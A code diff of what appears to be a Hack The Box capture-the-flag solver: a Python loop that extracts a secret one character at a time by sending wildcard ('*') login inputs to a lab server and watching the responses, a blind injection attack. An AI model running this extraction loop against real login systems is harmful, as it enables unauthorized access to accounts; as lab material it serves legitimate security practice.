@@ -5,19 +5,13 @@ url = "http://138.68.182.108:31009/"
 
 chars = ascii_lowercase + ascii_uppercase + '0123456789_{}+-!@#$%^&`~/\\\'"()'
 
-res = 'HTB{'
+res = ''
 
-
-# data = {
-# 	'username': '*',
-# 	'password': 'asdf'
-# }
-# r = requests.post(url + 'login', data)
-# print(r.text)
-# print(r.headers)
-# print(r.status_code)
 run = True
 while (run):
+	'''
+	loops forever, to find correct characters that pass
+	'''
 	for c in chars:
 		tmp = res + c + '*'
 		data = {
@@ -30,8 +24,4 @@ while (run):
 			print(r.headers)
 			res += c
 			break
-		# elif (r.headers['Content-Length'] != '0'):
-		# 	run = False
-		# 	print(c)
-		# 	break
 	print(res)
